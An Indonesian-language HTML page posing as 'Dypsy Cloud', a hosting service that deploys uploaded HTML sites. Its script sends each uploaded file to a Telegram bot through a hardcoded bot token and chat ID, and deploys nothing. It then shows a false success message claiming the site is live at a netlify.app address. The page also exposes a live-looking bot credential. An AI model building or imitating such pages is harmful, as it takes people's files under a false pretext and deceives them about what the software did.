<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dypsy Cloud - Ocean luxury</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --accent: #60a5fa; --glass: rgba(255, 255, 255, 0.02); }
        * { margin:0; padding:0; box-sizing:border-box; }
        
        @keyframes oceanWave {
            0%, 100% { transform: translateY(0) rotate(1deg); }
            50% { transform: translateY(-30px) rotate(-1deg); }
        }

        body { 
            background: #020617; color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; 
            min-height: 100vh; padding: 60px 20px; overflow-y: auto; display: flex; flex-direction: column; align-items: center;
        }

        /* NOTIFIKASI KITA SENDIRI (CUSTOM TOAST) */
        #notification-container {
            position: fixed; top: 20px; right: 20px; z-index: 10000;
            display: flex; flex-direction: column; gap: 10px;
        }
        .dypsy-notif {
            background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(15px);
            border: 1px solid var(--accent); border-radius: 20px;
            padding: 15px 25px; color: #fff; display: flex; align-items: center; gap: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 0 10px rgba(96, 165, 250, 0.2);
            transform: translateX(120%); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .dypsy-notif.show { transform: translateX(0); }
        .dypsy-notif i { font-size: 1.2rem; color: var(--accent); }

        .main-card { 
            background: var(--glass); backdrop-filter: blur(60px); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 50px; padding: 50px; width: 100%; max-width: 950px; 
            animation: oceanWave 12s infinite ease-in-out; margin-bottom: 60px;
            box-shadow: 0 60px 150px rgba(0,0,0,0.8);
        }

        .infra-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; width: 100%; max-width: 950px; }
        .infra-box { 
            background: var(--glass); padding: 35px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.08);
            animation: oceanWave 8s infinite ease-in-out; transition: 0.4s;
        }
        .infra-box:hover { border-color: var(--accent); transform: scale(1.05); background: rgba(96, 165, 250, 0.05); }

        input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; color:#fff; margin-bottom: 20px; outline: none; }
        
        .upload-zone { 
            border: 2px dashed rgba(255,255,255,0.1); padding: 60px; border-radius: 30px; 
            text-align: center; cursor: pointer; background: rgba(0,0,0,0.2); transition: 0.3s;
        }
        .upload-zone:hover { border-color: var(--accent); background: rgba(59, 130, 246, 0.05); }

        iframe { width: 100%; height: 400px; border: 10px solid rgba(255,255,255,0.1); border-radius: 30px; margin-top: 30px; background: #fff; display: none; }

        /* MODAL BOX */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); backdrop-filter: blur(15px);
            display: none; justify-content: center; align-items: center; z-index: 1000;
        }
        .modal-box {
            background: #0f172a; border: 2px solid var(--accent); border-radius: 40px;
            padding: 40px; width: 90%; max-width: 500px; text-align: center; position: relative;
            box-shadow: 0 0 50px rgba(96, 165, 250, 0.2);
        }
        .close-x { position: absolute; top: 20px; right: 25px; font-size: 25px; cursor: pointer; color: #666; }
        .result-link {
            background: rgba(0,0,0,0.4); padding: 15px; border-radius: 15px;
            margin: 20px 0; border: 1px solid rgba(255,255,255,0.1);
            display: flex; justify-content: space-between; align-items: center;
        }
        .btn-copy { background: var(--accent); color: #000; border: none; padding: 8px 15px; border-radius: 10px; font-weight: 700; cursor: pointer; }
        .btn-new { width: 100%; padding: 15px; border-radius: 15px; border: 1px solid var(--accent); background: transparent; color: #fff; cursor: pointer; font-weight: 600; }
    </style>
</head>
<body>

    <div id="notification-container"></div>

    <header style="margin-bottom: 50px; text-align: center;">
        <h1 style="font-size: 3.5rem; font-weight: 900;">Dypsy <span style="color:var(--accent)">Cloud</span></h1>
    </header>

    <div class="main-card">
        <img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1000" style="width:100%; height:180px; object-fit:cover; border-radius:30px; margin-bottom:30px;">
        <input type="text" id="webName" placeholder="Tentukan Nama Website (Contoh: My Luxury Web)">
        <div class="upload-zone" onclick="document.getElementById('f').click()">
            <i class="fas fa-ship fa-3x" style="color: var(--accent); margin-bottom: 15px;"></i>
            <p id="fn" style="font-size: 1.1rem; font-weight: 700;">Seret HTML ke Sini</p>
            <input type="file" id="f" hidden accept=".html" onchange="load(this)">
        </div>
        <button id="deployBtn" onclick="startDeploy()" style="width:100%; padding:25px; border-radius:25px; border:none; background:linear-gradient(135deg, #3b82f6, #8b5cf6); color:#fff; font-weight:900; margin-top:20px; cursor:pointer;">LUNCURKAN KE CLOUD</button>
        <iframe id="pv"></iframe>
    </div>

    <div class="infra-grid">
        <div class="infra-box" style="animation-delay: 1s;"><h4>DEDICATED NODE</h4><p style="color:#64748b; font-size: 0.8rem; margin-top:10px;">Server eksklusif tanpa gangguan.</p></div>
        <div class="infra-box" style="animation-delay: 2s;"><h4>GLOBAL CDN</h4><p style="color:#64748b; font-size: 0.8rem; margin-top:10px;">Kecepatan akses tanpa batas.</p></div>
        <div class="infra-box" style="animation-delay: 3s;"><h4>SECURE CORE</h4><p style="color:#64748b; font-size: 0.8rem; margin-top:10px;">Enkripsi tingkat kuantum.</p></div>
    </div>

    <div class="modal-overlay" id="modal">
        <div class="modal-box">
            <span class="close-x" onclick="closeModal()">&times;</span>
            <i class="fas fa-check-circle fa-4x" style="color: #10b981; margin-bottom: 15px;"></i>
            <h2 style="margin-bottom: 5px;">Web Berhasil Di-Deploy</h2>
            <p style="color: #64748b; font-size: 0.8rem;">Website lo sekarang live di server Dypsy Netlify</p>
            <div class="result-link">
                <span id="urlResult" style="color: var(--accent); font-family: monospace; font-size: 0.9rem;"></span>
                <button class="btn-copy" onclick="copyLink()">SALIN</button>
            </div>
            <button class="btn-new" onclick="resetPage()">+ BUAT WEB BARU</button>
        </div>
    </div>

    <script>
        let selectedFile = null;
        const BOT_TOKEN = '8352237832:AAHHUI6vFhST6sNpsMO8cGwDnpr9hMPO2co';
        const CHAT_ID = '7446889039';

        // FUNGSI NOTIFIKASI KITA SENDIRI
        function showNotif(msg, icon = 'fa-info-circle') {
            const container = document.getElementById('notification-container');
            const notif = document.createElement('div');
            notif.className = 'dypsy-notif';
            notif.innerHTML = `<i class="fas ${icon}"></i> <span>${msg}</span>`;
            container.appendChild(notif);
            
            setTimeout(() => notif.classList.add('show'), 100);
            setTimeout(() => {
                notif.classList.remove('show');
                setTimeout(() => notif.remove(), 500);
            }, 3000);
        }

        function load(i) {
            if (i.files[0]) {
                selectedFile = i.files[0];
                const r = new FileReader();
                r.onload = (e) => {
                    const v = document.getElementById('pv');
                    v.srcdoc = e.target.result;
                    v.style.display = 'block';
                    document.getElementById('fn').innerText = selectedFile.name;
                    showNotif('File HTML berhasil dimuat!', 'fa-file-code');
                };
                r.readAsText(selectedFile);
            }
        }

        async function startDeploy() {
            const nameInput = document.getElementById('webName').value.trim();
            const name = nameInput.toLowerCase().replace(/\s+/g, '-');
            const btn = document.getElementById('deployBtn');

            if (!selectedFile || !name) {
                showNotif('Lengkapi nama dan file dulu!', 'fa-exclamation-triangle');
                return;
            }

            btn.innerText = "SEDANG MELUNCUR...";
            btn.disabled = true;
            showNotif('Sedang memproses ke server...', 'fa-spinner fa-spin');

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', selectedFile, `${name}.html`);
            formData.append('caption', `ðŸš¢ DYPSY CLOUD DEPLOY\n\nProject: ${name}\nLive: https://${name}.netlify.app`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST', body: formData
                });

                document.getElementById('urlResult').innerText = `https://${name}.netlify.app`;
                document.getElementById('modal').style.display = 'flex';
                showNotif('Deploy Berhasil!', 'fa-check-circle');

            } catch (err) {
                showNotif('Koneksi bermasalah!', 'fa-wifi');
            } finally {
                btn.innerText = "LUNCURKAN KE CLOUD";
                btn.disabled = false;
            }
        }

        function copyLink() {
            const link = document.getElementById('urlResult').innerText;
            navigator.clipboard.writeText(link);
            showNotif('Link disalin ke clipboard!', 'fa-copy');
        }

        function closeModal() { document.getElementById('modal').style.display = 'none'; }
        function resetPage() { location.reload(); }
    </script>
</body>
</html>
